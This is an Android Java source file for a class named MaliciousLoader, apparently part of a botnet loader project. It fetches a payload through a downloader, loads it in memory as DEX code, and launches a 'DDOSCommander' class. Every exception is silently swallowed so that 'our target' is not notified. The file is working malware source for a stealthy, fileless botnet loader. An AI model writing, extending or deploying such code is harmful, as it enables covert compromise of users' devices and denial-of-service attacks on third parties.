package com.a.botnetloaderfrominmemorydexexample;

import android.content.Context;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import dalvik.system.InMemoryDexClassLoader;

public class MaliciousLoader implements Runnable {

    private Context context;

    MaliciousLoader(Context applicationContext) {
        this.context = applicationContext;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void run() {

        ExecutorService pool = Executors.newFixedThreadPool(1);
        Future<ByteArrayOutputStream> future = pool.submit(new DownloaderCallable());
        try {
            ByteBuffer byteBuffer = ByteBuffer.wrap(future.get().toByteArray());

            InMemoryDexClassLoader inMemoryDexClassLoader = new InMemoryDexClassLoader(byteBuffer, context.getClassLoader());

            Class<?> dynamicClass = inMemoryDexClassLoader.loadClass("com.a.androidDDOS.DDOSCommander");
            Constructor<?> ctor = dynamicClass.getDeclaredConstructor();
            Thread thread = new Thread((Runnable) ctor.newInstance());
            thread.start();
        } catch (Exception ignore) {
            //because we do not want to notify our target about any actions
        }
    }
}
